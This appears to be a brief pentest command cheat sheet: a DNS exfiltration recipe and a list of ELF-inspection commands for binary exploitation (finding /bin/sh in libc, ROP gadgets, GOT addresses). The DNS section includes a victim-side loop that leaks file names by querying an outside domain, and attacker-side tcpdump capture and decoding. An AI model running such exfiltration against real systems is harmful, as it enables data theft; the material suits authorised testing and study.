# PentestCommands

## DNS Exfiltration 

1. On Victim machine Linux
```Bash
 for i in `ls`; do host $i.domain.com domain.com;done
 ```
2. On Attacker's machine
 ```Bash
 tcpdump -vvv -s 0 -l -n dst host domain.com and dst port 53 -w dump
 ```
3. To view data only for saved packet dump
 ```Bash
 tcpdump -r dump|cut -d"?" -f2|awk 'split($0,a,".domain"){print a[1]}'|sort -u
 ```
		
## Binary Exploitation (linux)

1. Find the offset of /bin/sh in libc
```Bash
strings -a -t x /lib/libc-2.11.2.so |grep "/bin/sh"
```
2. Find ROP gadgets
```Bash
objdump -d -M intel ./<binary.elf>|grep -B5 "ret"
```	
3. Find if stack is execuatble and writable memory locations
```Bash
readelf -lS ./<binary.elf>
```
4.Find memory address of Global offset table
```Bash
objdump -R ./binary.elf
```
5. Get Entry point of ELF file
```Bash
readelf -h ./binary.elf
```
6. Get file headers, section headers and program headers
```Bash
readelf -e ./binary.elf
```